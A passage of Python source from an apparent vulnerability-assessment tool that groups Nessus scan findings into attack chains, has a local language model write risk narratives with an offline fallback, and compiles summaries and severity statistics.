            f"Evidence from Nessus scan:\n{evidence_text}\n\n"
            f"Attack Steps:\n"
            + "\n".join(f"  {i+1}. {s}" for i, s in enumerate(chain["steps"]))
            + "\n\nWrite a 3-4 sentence professional attack narrative explaining:\n"
            "1. How the individual findings combine into a critical attack path\n"
            "2. What an attacker can achieve (business impact)\n"
            "3. Why this is more severe than the individual finding severities suggest\n"
            "Be concise and technical. Do not use bullet points."
        )

        narrative = await _chat_async(prompt)
        # Strip DeepSeek think tags if present
        narrative = re.sub(r"<think>.*?</think>", "", narrative, flags=re.DOTALL).strip()
        return narrative

    except Exception as e:
        log.warning("LLM narration failed: %s — using offline narrative", e)
        return _offline_narrative(chain)


def _offline_narrative(chain: dict) -> str:
    """Offline narrative when Ollama is unavailable."""
    hosts = ", ".join(chain["affected_hosts"][:5]) or "multiple hosts"
    individual = " and ".join(chain["individual_severities"][:3])
    return (
        f"This attack chain combines {len(chain['evidence'])} individually "
        f"{individual}-severity findings on {hosts} into a {chain['upgraded_risk']}-severity "
        f"attack path. {chain['description']} "
        f"The combined risk is significantly higher than any single finding because "
        f"each vulnerability enables the next step in the chain, allowing an attacker "
        f"to achieve {chain['steps'][-1].lower() if chain['steps'] else 'full compromise'} "
        f"without needing advanced capabilities."
    )


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

async def run_chain_detection(findings: list, narrate: bool = True) -> dict:
    """
    Full pipeline: detect chains → generate narratives → generate PoC scripts.

    Args:
        findings : list of normalized finding dicts from findings_store
        narrate  : whether to call Ollama for LLM narrative (default True)

    Returns dict:
        chains_detected  : int
        chains           : list of chain dicts with narrative + poc_script
        summary          : plain-text summary
        scan_stats       : total findings, unique hosts, etc.
    """
    if not findings:
        return {
            "chains_detected": 0,
            "chains": [],
            "summary": "No findings loaded. Upload a Nessus scan first.",
            "scan_stats": {},
        }

    log.info("Running attack chain detection on %d findings", len(findings))

    # 1. Detect chains
    chains = detect_chains(findings)
    log.info("Detected %d chains", len(chains))

    # 2. For each chain: add narrative + PoC script
    narrative_tasks = []
    if narrate:
        for chain in chains:
            narrative_tasks.append(_llm_narrate_chain(chain))
        if narrative_tasks:
            narratives = await asyncio.gather(*narrative_tasks, return_exceptions=True)
            for i, chain in enumerate(chains):
                narr = narratives[i]
                chain["narrative"] = narr if isinstance(narr, str) else _offline_narrative(chain)
        else:
            for chain in chains:
                chain["narrative"] = _offline_narrative(chain)
    else:
        for chain in chains:
            chain["narrative"] = _offline_narrative(chain)

    # 3. Generate PoC scripts
    for chain in chains:
        chain["poc_script"] = generate_poc_script(chain)

    # 4. Build summary
    crit = sum(1 for c in chains if c["upgraded_risk"] == "CRITICAL")
    high = sum(1 for c in chains if c["upgraded_risk"] == "HIGH")
    all_hosts = set()
    for c in chains:
        all_hosts.update(c["affected_hosts"])

    summary_lines = [
        f"Attack chain detection complete: {len(chains)} chain(s) found.",
    ]
    if crit:
        summary_lines.append(f"  CRITICAL chains: {crit} — immediate remediation required.")
    if high:
        summary_lines.append(f"  HIGH chains    : {high}")
    if chains:
        summary_lines.append(f"  Affected hosts : {len(all_hosts)} unique IPs involved in chains.")
        summary_lines.append("")
        for c in chains:
            summary_lines.append(f"  [{c['upgraded_risk']}] {c['name']}")
            summary_lines.append(f"          Hosts: {', '.join(c['affected_hosts'][:5]) or 'N/A'}")
            summary_lines.append(f"          MITRE: {', '.join(c['mitre'])}")
    else:
        summary_lines.append("  No multi-step attack chains detected in current findings.")
        summary_lines.append("  (This may mean individual findings are isolated or scan coverage is partial.)")

    # 5. Scan stats
    unique_hosts = set()
    for f in findings:
        unique_hosts.update(f.get("hosts", []))
    sev_counts = {}
    for f in findings:
        s = f.get("severity", "info")
        sev_counts[s] = sev_counts.get(s, 0) + 1

    return {
        "chains_detected": len(chains),
        "chains": chains,
        "summary": "\n".join(summary_lines),
        "scan_stats": {
            "total_findings": len(findings),
            "unique_hosts": len(unique_hosts),
            "severity_breakdown": sev_counts,
            "chains_critical": crit,
            "chains_high": high,
        },
    }
